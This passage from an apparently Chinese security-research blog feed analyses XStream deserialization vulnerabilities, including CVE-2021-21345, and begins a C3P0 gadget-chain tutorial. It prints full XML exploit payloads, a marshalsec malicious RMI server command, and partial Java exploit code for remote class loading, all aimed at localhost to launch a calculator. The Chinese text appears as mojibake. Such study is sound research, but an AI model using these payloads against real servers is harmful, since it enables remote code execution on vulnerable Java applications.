class="hljs-name">null</span>/&gt;</span><br>                                            <span class="hljs-tag">&lt;/<span class="hljs-name">strMatchColumns</span>&gt;</span><br>                                        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>                                    <span class="hljs-tag">&lt;/<span class="hljs-name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span><br>                                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>                            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ‰“çš„æ˜¯jndiæ³¨å…¥</p><p>é‚£æˆ‘ä»¬å°±éœ€è¦èµ·ä¸€ä¸ªæ¶æ„çš„rmiæœåŠ¡ï¼Œè¿™é‡Œç”¨marshalsecæ¥èµ·æœåŠ¡</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">java -cp marshalsec-<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://<span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8888</span>/#exp<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106152810804.png" alt="image-20241106152810804"></p><p>webæœåŠ¡ä¸‹æœ‰ä¸€ä¸ªè®¡ç®—å™¨çš„exp.class</p><p><img src="https://cdn.clown2024.cn/image-20241106153040392.png" alt="image-20241106153040392"></p><h2 id="cve-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2021-21345è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h2><p>å½±å“ç‰ˆæœ¬&lt;&#x3D;1.4.15</p><p>poc</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span> <span class="hljs-attr">serialization</span>=<span class="hljs-string">&#x27;custom&#x27;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">unserializable-parents</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">size</span>&gt;</span>2<span class="hljs-tag">&lt;/<span class="hljs-name">size</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">comparator</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">indexMap</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">packet</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">message</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br>              <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">bridge</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">bi</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">jaxbType</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">uriProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">attributeProperties</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">inheritedAttWildcard</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">getter</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="hljs-tag">&lt;/<span class="hljs-name">class</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>verify<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">parameter-types</span>/&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">getter</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">inheritedAttWildcard</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">bi</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">tagName</span>/&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">context</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">marshallerPool</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">outer-class</span> <span class="hljs-attr">reference</span>=<span class="hljs-string">&#x27;../..&#x27;</span>/&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">marshallerPool</span>&gt;</span><br>                      <span class="hljs-tag">&lt;<span class="hljs-name">nameList</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">boolean</span>&gt;</span>true<span class="hljs-tag">&lt;/<span class="hljs-name">boolean</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">nsUriCannotBeDefaulted</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">namespaceURIs</span>&gt;</span><br>                        <span class="hljs-tag">&lt;<span class="hljs-name">localNames</span>&gt;</span><br>                          <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>                        <span class="hljs-tag">&lt;/<span class="hljs-name">localNames</span>&gt;</span><br>                      <span class="hljs-tag">&lt;/<span class="hljs-name">nameList</span>&gt;</span><br>                    <span class="hljs-tag">&lt;/<span class="hljs-name">context</span>&gt;</span><br>                  <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">bridge</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">jaxbObject</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br>                  <span class="hljs-tag">&lt;<span class="hljs-name">activationCmd</span>&gt;</span>calc<span class="hljs-tag">&lt;/<span class="hljs-name">activationCmd</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">jaxbObject</span>&gt;</span><br>              <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">message</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">satellites</span>/&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">invocationProperties</span>/&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">packet</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">indexMap</span>&gt;</span><br>      <span class="hljs-tag">&lt;/<span class="hljs-name">comparator</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">default</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">int</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">int</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="hljs-tag">&lt;/<span class="hljs-name">string</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">java.util.PriorityQueue</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241106153336587.png" alt="image-20241106153336587"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96">https://y4tacker.github.io/2022/02/10/year/2022/2/XStream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96</a></p><p><a href="https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&u_asig=1a0c399d17307034326662515e00b6&time__1311=n4+xyie7wxg0GODlxGrzGWwxYqGKG8AlD0O+iD">https://xz.aliyun.com/t/11372?u_atoken=d255e03184aefd4a575a1a82fa1faa70&amp;u_asig=1a0c399d17307034326662515e00b6&amp;time__1311=n4%2Bxyie7wxg0GODlxGrzGWwxYqGKG8AlD0O%2BiD</a></p><p>åé¢ç‰ˆæœ¬çš„ä¿®å¤éƒ½æ˜¯é»‘ç™½åå•çš„å½¢å¼æ¥ä¿®å¤ï¼Œè¿™ç¯‡æ–‡ç« æ€»ç»“çš„æ›´åŠ è¯¦ç»†ï¼š<a href="https://tttang.com/archive/1699/">https://tttang.com/archive/1699/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;xstreamä»‹ç»&quot;&gt;&lt;a href=&quot;#XStreamä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;XStreamä»‹ç»&quot;&gt;&lt;/a&gt;XStreamä»‹ç»&lt;/h1&gt;&lt;p&gt;XStreamæ˜¯ä¸€ä¸ªç®€å•çš„åŸºäºJavaåº“ï¼Œèƒ½å¤Ÿå°†Javaå¯¹è±¡å’Œxmlæ–‡æ¡£ä¹‹é—´è¿›è¡Œç›¸äº’</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>C3P0åˆ©ç”¨é“¾å­¦ä¹ </title>
    <link href="https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <id>https://clowsman.github.io/2024/11/01/C3P0%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</id>
    <published>2024-11-01T04:34:42.000Z</published>
    <updated>2024-12-03T13:09:21.916Z</updated>
    
    <content type="html"><![CDATA[<h1 id="c3p0ä»‹ç»"><a href="#C3P0ä»‹ç»" class="headerlink" title="C3P0ä»‹ç»"></a>C3P0ä»‹ç»</h1><p>C3P0æ˜¯ä¸€ä¸ªå¼€æºçš„JDBCè¿æ¥æ± ï¼Œå®ƒå®ç°äº†æ•°æ®æºå’ŒJNDIç»‘å®šï¼Œæ”¯æŒJDBC3è§„èŒƒå’ŒJDBC2çš„æ ‡å‡†æ‰©å±•ã€‚ç›®å‰ä½¿ç”¨å®ƒçš„å¼€æºé¡¹ç›®æœ‰Hibernateï¼ŒSpringç­‰ã€‚</p><p>JDBCæ˜¯Java DataBase Connectivityçš„ç¼©å†™ï¼Œå®ƒæ˜¯Javaç¨‹åºè®¿é—®æ•°æ®åº“çš„æ ‡å‡†æ¥å£ã€‚<br>ä½¿ç”¨Javaç¨‹åºè®¿é—®æ•°æ®åº“æ—¶ï¼ŒJavaä»£ç å¹¶ä¸æ˜¯ç›´æ¥é€šè¿‡TCPè¿æ¥å»è®¿é—®æ•°æ®åº“ï¼Œè€Œæ˜¯é€šè¿‡JDBCæ¥å£æ¥è®¿é—®ï¼Œè€ŒJDBCæ¥å£åˆ™é€šè¿‡JDBCé©±åŠ¨æ¥å®ç°çœŸæ­£å¯¹æ•°æ®åº“çš„è®¿é—®ã€‚</p><p>è¿æ¥æ± ç±»ä¼¼äºçº¿ç¨‹æ± ï¼Œåœ¨ä¸€äº›æƒ…å†µä¸‹æˆ‘ä»¬ä¼šé¢‘ç¹åœ°æ“ä½œæ•°æ®åº“ï¼Œæ­¤æ—¶Javaåœ¨è¿æ¥æ•°æ®åº“æ—¶ä¼šé¢‘ç¹åœ°åˆ›å»ºæˆ–é”€æ¯å¥æŸ„ï¼Œå¢å¤§èµ„æºçš„æ¶ˆè€—ã€‚ä¸ºäº†é¿å…è¿™æ ·ä¸€ç§æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥æå‰åˆ›å»ºå¥½ä¸€äº›è¿æ¥å¥æŸ„ï¼Œéœ€è¦ä½¿ç”¨æ—¶ç›´æ¥ä½¿ç”¨å¥æŸ„ï¼Œä¸éœ€è¦æ—¶å¯å°†å…¶æ”¾å›è¿æ¥æ± ä¸­ï¼Œå‡†å¤‡ä¸‹ä¸€æ¬¡çš„ä½¿ç”¨ã€‚ç±»ä¼¼è¿™æ ·ä¸€ç§èƒ½å¤Ÿå¤ç”¨å¥æŸ„çš„æŠ€æœ¯å°±æ˜¯æ± æŠ€æœ¯ã€‚</p><h1 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h1><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!-- https://mvnrepository.com/artifact/com.mchange/c3p0 --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.mchange<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>c3p0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>0.9.5.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h1><p>C3P0çš„å¸¸è§åˆ©ç”¨æ–¹å¼æœ‰ä¸‰ç§ï¼š</p><ul><li>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</li><li>JNDIæ³¨å…¥</li><li>åˆ©ç”¨HEXåºåˆ—åŒ–å­—èŠ‚åŠ è½½å™¨è¿›è¡Œååºåˆ—åŒ–æ”»å‡»</li></ul><h2 id="urlclassloaderè¿œç¨‹ç±»åŠ è½½"><a href="#URLClassLoaderè¿œç¨‹ç±»åŠ è½½" class="headerlink" title="URLClassLoaderè¿œç¨‹ç±»åŠ è½½"></a>URLClassLoaderè¿œç¨‹ç±»åŠ è½½</h2><p>è°ƒç”¨é“¾</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">PoolBackedDataSourceBase#readObject -&gt;<br>ReferenceSerialized#getObject -&gt;<br>ReferenceableUtils#referenceToObject -&gt;<br>ObjectFactory#getObjectInstance<br></code></pre></td></tr></table></figure><h3 id="æµç¨‹åˆ†æ"><a href="#æµç¨‹åˆ†æ" class="headerlink" title="æµç¨‹åˆ†æ"></a>æµç¨‹åˆ†æ</h3><p>é¦–å…ˆæ¥çœ‹PoolBackedDataSourceBase#readObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101134337171.png" alt="image-20241101134337171"></p><p>æ¼æ´çš„è§¦å‘å…¥å£å°±åœ¨è¿™ï¼Œå¦‚æœååºåˆ—åŒ–å¾—åˆ°çš„Objectä¸ºIndirectlySerializedï¼Œå°±ä¼šè°ƒç”¨å…¶getObjectæ–¹æ³•</p><p>IndirectlySerializedæ˜¯ä¸€ä¸ªæ¥å£ï¼Œä»–çš„å®ç°ç±»å°±æ˜¯ReferenceSerializedï¼Œé‚£æ¥ä¸‹æ¥å»çœ‹çœ‹ä»–çš„getObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135245450.png" alt="image-20241101135245450"></p><p>ReferenceSerializedç±»æ˜¯ReferenceIndirectorçš„ä¸€ä¸ªå†…éƒ¨ç±»ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°è¿™é‡Œå…¶å®å·²ç»å‡ºç°äº†initialContext.lookupæ–¹æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬åœ¨ååºåˆ—åŒ–çš„æ—¶å€™å…¶å®æ˜¯æ— æ³•è°ƒç”¨è¯¥æ–¹æ³•çš„ï¼Œå› ä¸ºcontextNameé»˜è®¤ä¸ºnullä¸”ä¸å¯æ§</p><p>é‚£ç»§ç»­å¾€ä¸‹çœ‹ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101135741940.png" alt="image-20241101135741940"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå°±åˆ©ç”¨äº†URLClassLoaderæ¥è¿›è¡Œè¿œç¨‹ç±»åŠ è½½ï¼Œåªéœ€è¦æˆ‘ä»¬è®¾ç½®è¿œç¨‹å·¥å‚ç±»åœ°å€<code>fClassLocation</code></p><p>é‚£ç°åœ¨è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬è¦å¦‚ä½•æ„é€ ReferenceSerializedè¿™ä¸ªç±»å‘¢ï¼Œè¿™ä¸ªç±»ä»ä¸Šé¢æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯ä¸€ä¸ªç§æœ‰çš„ç±»ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥è·å–ï¼Œé‚£å°±çœ‹ä¸€ä¸‹æœ‰è°è°ƒç”¨äº†ä»–çš„æ„é€ æ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241101185304051.png" alt="image-20241101185304051"></p><p>å¯ä»¥å‘ç°åœ¨å¤–éƒ¨ç±»ReferenceIndirector#indirectFormæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨</p><p><img src="https://cdn.clown2024.cn/image-20241101185405398.png" alt="image-20241101185405398"></p><p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•æˆ‘ä»¬ä¸æ–¹ä¾¿è°ƒç”¨ï¼Œæ‰€ä»¥ç»§ç»­å¾€ä¸Šæ‰¾ï¼Œå‘ç°åœ¨PoolBackedDataSourceBase#writeObjectæ–¹æ³•é‡Œé¢è¿›è¡Œäº†è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨æ­£å¸¸åºåˆ—åŒ–çš„æµç¨‹ä¸­å°±å¯ä»¥å®Œæˆè¿™ä¸ªæ“ä½œ</p><p><img src="https://cdn.clown2024.cn/image-20241101190429527.png" alt="image-20241101190429527"></p><p>è¿™é‡Œå…¶å®æœ‰ä¸¤ä¸ªindirectFormæ–¹æ³•çš„è°ƒç”¨ï¼Œä½†æ˜¯æˆ‘ä»¬é€‰æ‹©è¿™ä¸ªå‚æ•°ä¸ºConnectionPoolDataSourceçš„æ–¹æ³•</p><p>æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹ä»–èµ°åˆ°è¿™é‡Œçš„é€»è¾‘ï¼Œå¯ä»¥çœ‹åˆ°ä»–å…ˆå°è¯•åºåˆ—åŒ–ConnectionPoolDataSourceï¼Œå¦‚æœæŠ›å‡ºä¸èƒ½ååºåˆ—åŒ–çš„å¼‚å¸¸ï¼Œä»–å°±ä¼šè°ƒç”¨è¿™ä¸ªindirectFormæ–¹æ³•</p><p>æˆ‘ä»¬çœ‹ä¸€ä¸‹è¿™ä¸ªç±»</p><p><img src="https://cdn.clown2024.cn/image-20241101191307567.png" alt="image-20241101191307567"></p><p>å®ƒæœ¬èº«æ˜¯æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªè¦æ‰¾ä¸€ä¸ªä»–çš„å®ç°ç±»ä¸”æ²¡æœ‰å®ç°åºåˆ—åŒ–æ¥å£å°±å¯ä»¥æŠ›å‡ºå¼‚å¸¸ï¼Œä»è€Œèµ°åˆ°indirectFormæ–¹æ³•çš„é€»è¾‘ï¼Œæˆ–è€…è‡ªå·±å®ç°è¿™ä¸ªæ¥å£ä¹Ÿå¯ä»¥</p><h3 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ " class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h3><p>é‚£ç°åœ¨æˆ‘ä»¬å°±å¯ä»¥è¿›è¡Œexpçš„ç¼–å†™äº†</p><p>è¿™é‡Œé‡‡ç”¨è‡ªå·±å®ç°ConnectionPoolDataSourceæ¥å£çš„æ–¹æ³•ï¼Œè€Œä¸”è¿™é‡Œæˆ‘ä»¬è¿˜éœ€è¦è‡ªå·±å®ç°ä¸€ä¸ªReferenceableæ¥å£ï¼Œå› ä¸ºindirectFormæ–¹æ³•é‡Œé¢ä¼ å…¥Referenceå¯¹è±¡çš„æ–¹å¼ä¸å¤ªä¸€æ ·</p><p><img src="https://cdn.clown2024.cn/image-20241101193611019.png" alt="image-20241101193611019"></p><p>è¿™é‡Œæ˜¯è°ƒç”¨ä¸€ä¸ªgetReferenceæ–¹æ³•æ¥è·å–Referenceå¯¹è±¡çš„</p><p>æœ€ç»ˆexpå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0_URLClassloader</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable&#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;ExpClass&quot;</span>,<span class="hljs-string">&quot;exp&quot;</span>,<span class="hljs-string">&quot;http://127.0.0.1:8888/&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span 